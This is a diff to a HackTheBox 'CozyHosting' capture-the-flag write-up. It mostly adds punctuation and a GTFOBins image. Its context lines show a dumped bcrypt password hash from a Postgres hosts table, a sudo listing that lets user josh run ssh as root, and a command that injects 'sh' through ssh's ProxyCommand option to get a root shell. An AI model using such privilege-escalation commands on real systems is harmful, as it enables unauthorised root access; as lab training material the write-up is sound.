@@ -345,7 +345,7 @@ Type "help" for help.
 postgres=#
 ```
 
-> Postgres [cheatsheet](https://postgrescheatsheet.com/#/databases)
+> Postgres [cheatsheet](https://postgrescheatsheet.com/#/databases).
 
 ```shell
 # list databases
@@ -400,7 +400,7 @@ cozyhosting-# select * from hosts;
 $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
 ```
 
-> `$2a$` is [_blowfish_](https://www.baeldung.com/cs/des-vs-3des-vs-blowfish-vs-aes#3-blowfish)
+> `$2a$` is [_blowfish_](https://www.baeldung.com/cs/des-vs-3des-vs-blowfish-vs-aes#3-blowfish).
 
 ```shell
 ┌──(kali㉿CSpanias)-[~/htb/cozyhosting]
@@ -480,6 +480,11 @@ Matching Defaults entries for josh on localhost:
 User josh may run the following commands on localhost:
     (root) /usr/bin/ssh *
 ```
+
+<figure>
+    <img src="gtfobins_sudo_ssh.png"
+    alt="GTFO Sudo ssh" >
+</figure>
 
 ```shell
 josh@cozyhosting:/app$ sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
